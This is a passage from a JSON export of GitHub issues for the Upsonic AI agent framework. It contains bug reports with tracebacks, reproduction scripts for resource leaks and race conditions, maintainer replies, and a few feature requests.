+      "body": "Traceback (most recent call last):\n  File \"/home/happy/workspaces/api-agent/test.py\", line 38, in <module>\n    result = web_agent.print_do(task)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/agent_configuration/agent_configuration.py\", line 300, in print_do\n    return asyncio.run(self.print_do_async(task))\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/asyncio/runners.py\", line 44, in run\n    return loop.run_until_complete(main)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/asyncio/base_events.py\", line 649, in run_until_complete\n    return future.result()\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/agent_configuration/agent_configuration.py\", line 304, in print_do_async\n    result = await self.do_async(task)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/agent_configuration/agent_configuration.py\", line 280, in do_async\n    return await execute_task_async(self, task, self.debug)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/agent_configuration/agent_configuration.py\", line 142, in execute_task_async\n    await the_client.run_async(agent_config, task)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/base.py\", line 255, in run_async\n    return await self.agent_async(args[0], args[1])\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/level_two/agent.py\", line 218, in agent_async\n    the_characterization = await self.create_characterization_async(agent_configuration, llm_model, task.price_id)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/level_two/agent.py\", line 524, in create_characterization_async\n    await Direct.do_async(human_objective_task, llm_model, retry=agent_configuration.retry, client=agent_configuration.client)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/direct_llm_call/direct_llm_cal.py\", line 284, in do_async\n    return await DirectStatic.do_async(task, model, client, debug, retry)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/direct_llm_call/direct_llm_cal.py\", line 73, in do_async\n    await the_client.call_async(task, model, retry=retry)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/level_one/call.py\", line 143, in call_async\n    raise outer_e\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/level_one/call.py\", line 134, in call_async\n    call_end(the_result[\"result\"], the_result[\"llm_model\"], the_result[\"response_format\"], start_time, time.time(), the_result[\"usage\"], the_result[\"tool_usage\"], self.debug)\n  File \"/home/happy/workspaces/api-agent/.conda/lib/python3.10/site-packages/upsonic/client/printing.py\", line 179, in call_end\n    table.add_row(\"[bold]Job Title:[/bold]\", f\"[magenta]{escape_rich_markup(result.job_title)}[/magenta]\")\n  File \"/home/yf/.local/lib/python3.10/site-packages/pydantic/main.py\", line 994, in __getattr__\n    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')\nAttributeError: 'HumanObjective' object has no attribute 'job_title'",
+      "state": "closed",
+      "author": "orchief",
+      "author_type": "User",
+      "created_at": "2025-04-26T10:24:30Z",
+      "updated_at": "2025-04-27T01:16:43Z",
+      "closed_at": "2025-04-26T11:42:34Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 8,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/340/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/340",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/340",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.924300",
+      "comments": [
+        {
+          "author": "orchief",
+          "body": "```\nfrom upsonic import Agent, Task\nfrom upsonic.tools import Search\nimport os\nfrom upsonic import Agent, Task, ObjectResponse\n\nos.environ[\"DEEPSEEK_API_KEY\"] = \"sk-xsx\"\nos.environ[\"UPSONIC_TELEMETRY\"] = \"False\"\n\n\n# Define Fetch MCP configuration\nclass FetchMCP:\n    command = \"uvx\"\n    args = [\"mcp-",
+          "created_at": "2025-04-26T10:26:04Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Hi, can you show your pip freeze",
+          "created_at": "2025-04-26T10:26:16Z"
+        },
+        {
+          "author": "orchief",
+          "body": "`aiohappyeyeballs==2.6.1\naiohttp==3.11.18\naiosignal==1.3.2\nannotated-types==0.7.0\nanthropic==0.50.0\nanyio==4.9.0\nargcomplete==3.6.2\nasgiref==3.8.1\nasync-timeout==5.0.1\nazure-ai-documentintelligence==1.0.2\nazure-core==1.33.0\nazure-identity==1.21.0\nbeautifulsoup4==4.13.4\nboto3==1.38.3\nbotocore==1.38.3",
+          "created_at": "2025-04-26T10:27:36Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Thanks a lot, i am looking for fix.",
+          "created_at": "2025-04-26T10:28:18Z"
+        },
+        {
+          "author": "orchief",
+          "body": "python3.10.16\nnew conda env\npip install upsonic",
+          "created_at": "2025-04-26T10:28:30Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 337,
+      "title": "[BUG] No uv and nodejs situation in MCP server installation",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-04-25T16:01:04Z",
+      "updated_at": "2025-04-25T17:11:57Z",
+      "closed_at": "2025-04-25T17:11:57Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/337/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/337",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/337",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.162943",
+      "comments": []
+    },
+    {
+      "issue_number": 336,
+      "title": "[BUG] File Descriptor Leak in ServerManager",
+      "body": "\n**Describe the bug**\nThe ServerManager class has a file descriptor leak. When the server is started with redirect_output=True, the file handles for stdout and stderr are not properly closed if an exception occurs during server startup.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nfrom upsonic.server_manager import ServerManager\n\n# Create a server manager with invalid parameters to force an exception\nmanager = ServerManager(\n    app_path=\"invalid.module:app\",\n    host=\"127.0.0.1\",\n    port=8000,\n    name=\"test\"\n)\n\n# Start with redirect_output=True to create file handles\ntry:\n    manager.start(redirect_output=True)\nexcept Exception as e:\n    print(f\"Expected error: {e}\")\n\n# Check if file handles are still open\nprint(f\"_stdout_file closed: {manager._stdout_file.closed if manager._stdout_file else 'No file'}\") \nprint(f\"_stderr_file closed: {manager._stderr_file.closed if manager._stderr_file else 'No file'}\") \n```\n2. Run with this command\n```console\npython reproduce_leak.py\n```\n\n4. See error: The file handles remain open after the exception, causing a resource leak.\n\n**Expected behavior**\nFile handles should be properly closed in all cases, including when exceptions occur during server startup.\n\n**Desktop (please complete the following information):**\n- OS: Windows/Linux/macOS\n- Upsonic Version: latest\n- Python Version: 3.8+\n\n**Additional context**\nThis issue can lead to resource exhaustion over time, especially in applications that frequently start and stop servers or retry on failure.\n\nThe fix involves ensuring proper cleanup in the exception handling path of the start() method.",
+      "state": "open",
+      "author": "HFerrahoglu",
+      "author_type": "User",
+      "created_at": "2025-04-25T03:32:10Z",
+      "updated_at": "2025-04-25T03:35:01Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/336/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/336",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/336",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.162984",
+      "comments": [
+        {
+          "author": "HFerrahoglu",
+          "body": " Ensured proper cleanup of file handles in all code paths by moving the file handle closing logic into a finally block in the start() method:\n\n\n```python\n\n  def start(self, redirect_output: bool = False, force: bool = False):\n      \"\"\"Start the server if it's not already running.\"\"\"\n      if self.is",
+          "created_at": "2025-04-25T03:33:17Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 335,
+      "title": "[BUG] Race Condition in Port Availability Check",
+      "body": "**Describe the bug**\nThere's a race condition in the ServerManager between checking if a port is available and binding to it. This can lead to failures when multiple servers try to start simultaneously or when another process takes the port between the check and the actual server start.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nfrom upsonic.server_manager import ServerManager\nimport threading\nimport time\n\ndef start_server(port, delay=0):\n    manager = ServerManager(\n        app_path=\"your_app.module:app\",  # Replace with a valid app\n        host=\"127.0.0.1\",\n        port=port,\n        name=f\"test_{port}\"\n    )\n    \n    # Simulate a delay between check and bind\n    original_is_port_in_use = manager._is_port_in_use\n    def delayed_check():\n        result = original_is_port_in_use()\n        if delay > 0:\n            print(f\"Server {port}: Port check returned {result}, waiting {delay}s before continuing\")\n            time.sleep(delay)\n        return result\n    \n    manager._is_port_in_use = delayed_check\n    \n    try:\n        print(f\"Starting server on port {port}\")\n        manager.start()\n        print(f\"Server on port {port} started successfully\")\n        return manager\n    except Exception as e:\n        print(f\"Server on port {port} failed to start: {e}\")\n        return None\n\n# Start two servers with the same port, with a delay in the first one\nport = 8000\n\n# Start first server with a delay after port check\nthread1 = threading.Thread(target=lambda: start_server(port, delay=1))\nthread1.start()\n\n# Give a small head start to the first thread\ntime.sleep(0.1)\n\n# Start second server that will try to use the same port\nthread2 = threading.Thread(target=lambda: start_server(port))\nthread2.start()\n\n# Wait for both threads to complete\nthread1.join()\nthread2.join()\n```\n2. Run with this command\n```console\npython race_condition_demo.py\n```\n\n4. See error: Both servers might report the port is available, but only one can actually bind to it, causing an error.\n\n**Expected behavior**\nThe port availability check should be atomic with the binding operation to prevent race conditions.\n\n**Desktop (please complete the following information):**\n- OS: Windows/Linux/macOS\n- Upsonic Version: latest\n- Python Version: 3.8+\n\n**Additional context**\nThis race condition can cause intermittent failures in environments where multiple servers are started concurrently. The fix involves implementing a more robust port allocation mechanism, possibly using socket locking or a central port allocation service.",
+      "state": "open",
+      "author": "HFerrahoglu",
+      "author_type": "User",
+      "created_at": "2025-04-25T03:30:22Z",
+      "updated_at": "2025-04-25T03:34:29Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/335/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/335",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/335",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.349282",
+      "comments": [
+        {
+          "author": "HFerrahoglu",
+          "body": "Implemented a more robust port checking mechanism using socket locking:\n\n```python\n    def _is_port_available_and_lock(self) -> (bool, Optional[socket.socket]):\n        \"\"\"Check if the port is available and lock it if it is.\"\"\"\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOC",
+          "created_at": "2025-04-25T03:34:28Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 334,
+      "title": "[BUG] Incomplete Process Termination in ServerManager",
+      "body": "**Describe the bug**\nThe ServerManager.stop() method doesn't properly clean up child processes, potentially leaving orphaned processes when the server is stopped. This is particularly problematic with processes that spawn child processes.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nfrom upsonic.server_manager import ServerManager\nimport time\nimport psutil\n\n# Start a server that might spawn child processes\nmanager = ServerManager(\n    app_path=\"your_app.module:app\",  # Replace with a valid app\n    host=\"127.0.0.1\",\n    port=8000,\n    name=\"test\"\n)\n\n# Start the server\nmanager.start()\nprint(f\"Server started with PID: {manager._process.pid if manager._process else 'Unknown'}\")\n\n# Get the process and its children before stopping\nif manager._process:\n    parent_process = psutil.Process(manager._process.pid)\n    children_before = parent_process.children(recursive=True)\n    print(f\"Child processes before stop: {len(children_before)}\")\n\n# Stop the server\nmanager.stop()\ntime.sleep(2)  # Give some time for processes to terminate\n\n# Check if any child processes are still running\norphaned_processes = []\nfor proc in children_before:\n    try:\n        if proc.is_running():\n            orphaned_processes.append(proc.pid)\n    except psutil.NoSuchProcess:\n        pass\n\nprint(f\"Orphaned processes after stop: {orphaned_processes}\")\n```\n2. Run with this command\n```console\npython check_process_termination.py\n```\n\n4. See error: Some child processes may remain running after the server is stopped.\n\n**Expected behavior**\nAll child processes should be properly terminated when the server is stopped.\n\n**Desktop (please complete the following information):**\n- OS: Windows/Linux/macOS\n- Upsonic Version: latest\n- Python Version: 3.8+\n\n**Additional context**\nThis issue can lead to resource leaks and zombie processes over time. The fix involves ensuring that all child processes are properly terminated in the stop() method.",
+      "state": "open",
+      "author": "HFerrahoglu",
+      "author_type": "User",
+      "created_at": "2025-04-25T03:30:18Z",
+      "updated_at": "2025-04-25T03:34:04Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/334/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/334",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/334",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.570886",
+      "comments": [
+        {
+          "author": "HFerrahoglu",
+          "body": "Improved the stop() method to properly terminate all child processes:\n\n```python\n    def stop(self):\n        \"\"\"Stop the server if it's running.\"\"\"\n        # Try to stop process from PID file\n        pid = self._manage_pid_file(\"read\")\n        if pid:\n            try:\n                process = psuti",
+          "created_at": "2025-04-25T03:34:03Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 332,
+      "title": "task.response contains extra long characters and is truncated with.. to show.",
+      "body": "**Describe the bug**\ntask.response contains extra long characters and is truncated with.. to show.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nresult = await asyncio.to_thread(selected_agent.do, task)\nlogger.info(f\"result 执行成功, result={result}\")\n```\n2. Run with this command\n```console\n\n```\n\n4. See error\n\n<img width=\"611\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c4a74e22-db2c-45b2-936d-3987dff44a3a\" />\n\nresult The returned result image link is incomplete and begins with.. expressed. as shown in the figure.\n\n**Expected behavior**\nA clear and concise description of what you expected to happen.\n\n**Screenshots**\nIf applicable, add screenshots to help explain your problem.\n\n**Desktop (please complete the following information):**\n - OS: MacOS\n - Upsonic 0.48.0\n- Python 3.11\n\n\n**Additional context**\nAdd any other context about the problem here.\n",
+      "state": "open",
+      "author": "oicoderr",
+      "author_type": "User",
+      "created_at": "2025-04-14T05:55:58Z",
+      "updated_at": "2025-04-14T05:55:58Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/332/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/332",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/332",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790438",
+      "comments": []
+    },
+    {
+      "issue_number": 331,
+      "title": "Persistent Memory outside of filesystem",
+      "body": "**Is your feature request related to a problem? Please describe.**\nWill you support persistent memory for ephemeral agents? eg if we are running remote it would be nice to use S3 as a memory system instead of the local file system.\n\n\n**Describe the solution you'd like**\nAn adapter that allows config to point to another FS or data store\n\n",
+      "state": "open",
+      "author": "bennnym",
+      "author_type": "User",
+      "created_at": "2025-04-10T10:45:37Z",
+      "updated_at": "2025-04-10T10:45:37Z",
+      "closed_at": null,
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/331/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/331",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/331",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790463",
+      "comments": []
+    },
+    {
+      "issue_number": 328,
+      "title": "[FEATURE] Async Tool Support",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-04-07T16:29:19Z",
+      "updated_at": "2025-04-07T16:44:29Z",
+      "closed_at": "2025-04-07T16:44:29Z",
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/328/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/328",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/328",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790471",
+      "comments": []
+    },
+    {
+      "issue_number": 325,
+      "title": "CallErrorException: {'status_code': 500, 'detail': 'Exceeded maximum retries (5) for result validation'}",
+      "body": "Sentry Issue: [UPSONIC-10Z](https://upsonic.sentry.io/issues/6510560003/?referrer=github_integration)\n\n```\nCallErrorException: {'status_code': 500, 'detail': 'Exceeded maximum retries (5) for result validation'}\n(8 additional frame(s) were not displayed)\n...\n  File \"upsonic_xml_case1.py\", line 1542, in <module>\n    result = process_workflow_from_prompt(prompt)\n  File \"upsonic_xml_case1.py\", line 1494, in process_workflow_from_prompt\n    json_result = convert_bpmn_to_json(xml_result.xml_content, process_id, process_name)\n  File \"upsonic_xml_case1.py\", line 1474, in convert_bpmn_to_json\n    result = bpmn_json_converter.do(conversion_task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-04-04T20:02:02Z",
+      "updated_at": "2025-04-05T15:58:55Z",
+      "closed_at": "2025-04-05T15:58:55Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/325/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/325",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/325",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790478",
+      "comments": []
+    },
+    {
+      "issue_number": 323,
+      "title": "[BUG] {\\'message\\': \"Invalid value for \\'parallel_tool_calls\\': \\'parallel_tool_calls\\' is only allowed when \\'tools\\' are specified.\", \\'type\\': \\'invalid_request_error\\', \\'param\\': \\'parallel_tool_calls\\', \\'code\\': None}'}",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-04-04T07:48:19Z",
+      "updated_at": "2025-04-04T08:13:22Z",
+      "closed_at": "2025-04-04T08:13:22Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/323/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/323",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/323",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790502",
+      "comments": []
+    },
+    {
+      "issue_number": 321,
+      "title": "[FEATURE] Printing tool call logs",
+      "body": "**Is your feature request related to a problem? Please describe.**\nA clear and concise description of what the problem is. Ex. I'm always frustrated when [...]\n\n**Describe the solution you'd like**\nA clear and concise description of what you want to happen.\n\n**Describe alternatives you've considered**\nA clear and concise description of any alternative solutions or features you've considered.\n\n**Additional context**\nAdd any other context or screenshots about the feature request here.\n",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-04-03T19:12:27Z",
+      "updated_at": "2025-04-03T20:18:06Z",
+      "closed_at": "2025-04-03T20:18:06Z",
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/321/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/321",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/321",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790511",
+      "comments": []
+    },
+    {
+      "issue_number": 287,
+      "title": "[BUG] CallErrorException: Error adding tool: This tool seems not okay to use.",
+      "body": "Hi Guys,\n\njust trying to run demos from readme, both of them are giving errors out of the box.\n\n```\n********* ADDING MCP TOOL *********\nTraceback (most recent call last):\n  File \"D:\\portfolio\\car-shopper-agent\\upsonic_demo.py\", line 31, in <module>\n    result = web_agent.print_do(task)\n             ^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 228, in print_do\n    return asyncio.run(self.print_do_async(task))\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\\Lib\\asyncio\\runners.py\", line 190, in run\n    return runner.run(main)\n           ^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\\Lib\\asyncio\\runners.py\", line 118, in run\n    return self._loop.run_until_complete(task)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\\Lib\\asyncio\\base_events.py\", line 654, in run_until_complete\n    return future.result()\n           ^^^^^^^^^^^^^^^\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 232, in print_do_async\n    result = await self.do_async(task)\n             ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 208, in do_async\n    return await execute_task_async(self, task, self.debug)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 109, in execute_task_async\n    the_client = register_tools(the_client, task.tools)\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 27, in register_tools\n    client.mcp()(tool)\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\tools\\tools.py\", line 199, in decorator\n    self.add_mcp_tool(name, command, args, env)\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\tools\\tools.py\", line 166, in add_mcp_tool\n    error_handler(result)\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\level_utilized\\utility.py\", line 127, in error_handler\n    raise CallErrorException(result)\nupsonic.exception.CallErrorException: {'status_code': 500, 'message': 'Error adding tool: This tool seems not okay to use.'}\n```",
+      "state": "open",
+      "author": "merryHunter",
+      "author_type": "User",
+      "created_at": "2025-03-19T18:05:31Z",
+      "updated_at": "2025-04-03T12:33:29Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/287/reactions",
+        "total_count": 2,
+        "+1": 2,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/287",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/287",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:51.790518",
+      "comments": [
+        {
+          "author": "merryHunter",
+          "body": "for another task direct example from the docs, this bug occurs:\n```\nTraceback (most recent call last):\n  File \"C:\\Users\\chern\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\upsonic\\client\\level_one\\call.py\", line 39, in cal",
+          "created_at": "2025-03-19T18:08:08Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Thanks for reporting.  I am on it.",
+          "created_at": "2025-03-23T23:51:37Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Hey, can you check with our new release:\n\nhttps://github.com/Upsonic/Upsonic/releases/tag/v0.51.2\n\n```console\npip install upsonic==0.51.2\n```",
+          "created_at": "2025-04-03T12:33:27Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 304,
+      "title": "[BUG] web api example with agent in document doesn't work",
